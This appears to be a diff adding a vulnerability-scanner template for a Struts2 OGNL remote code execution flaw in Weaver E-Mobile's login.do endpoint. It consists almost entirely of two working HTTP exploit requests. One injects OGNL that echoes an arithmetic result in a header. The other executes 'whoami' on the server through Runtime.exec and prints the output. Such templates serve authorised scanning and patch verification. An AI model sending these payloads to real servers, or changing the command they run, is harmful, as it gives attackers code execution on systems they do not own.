@@ -1,0 +1,40 @@
+id: weaver-emobile-login-struts2-rce
+
+info:
+  name: Weaver E-Mobile login.do Struts2 Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits a remote code execution vulnerability in Weaver E-Mobile's login.do endpoint due to improper validation in Struts2 framework.
+  tags: rce,struts2,weaver
+  reference:
+    - https://fofa.so/
+
+http:
+  - raw:
+      - |
+        POST /manager/login.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        message=(%23_memberAccess=%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RES',22345*32379))
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-RES: 723508755"
+
+  - raw:
+      - |
+        POST /manager/login.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        message=(%23_memberAccess=%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23w=%23context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(%23w.print(%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec("whoami").getInputStream()))).(%23w.close())
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "^[a-zA-Z0-9_-]+$" # Expected output of 'whoami' command.
